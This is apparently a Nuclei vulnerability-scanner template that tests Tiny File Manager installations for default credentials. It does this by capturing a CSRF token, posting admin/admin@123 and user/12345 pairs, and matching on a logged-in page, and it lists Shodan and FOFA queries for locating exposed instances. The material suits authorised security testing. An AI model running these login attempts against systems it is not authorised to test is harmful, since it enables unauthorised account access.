http:
- attack: pitchfork
  cookie-reuse: true
  extractors:
  - internal: true
    name: token
    part: body
    regex:
    - ([a-f0-9]{64})
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    type: word
    words:
    - admin
    - You are logged in
    - Tiny File Manager
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    pass:
    - admin@123
    - 12345
    user:
    - admin
    - user
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    fm_usr={{user}}&fm_pwd={{pass}}&token={{token}}

    '
  - 'GET /?p= HTTP/1.1

    Host: {{Hostname}}

    '
  skip-variables-check: true
id: tiny-filemanager-default-login
info:
  author: rix4uni
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Tiny File Manager contains a default login vulnerability. An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    fofa-query:
    - title="Tiny File Manager"
    shodan-query:
    - http.title:"Tiny File Manager"
  name: Tiny File Manager - Default Login
  reference:
  - https://hackerone.com/reports/1747146
  - https://elements.heroku.com/buttons/skmdimtiaj/tinyfilemanager
  severity: critical
  tags: default-login,tiny,filemanager
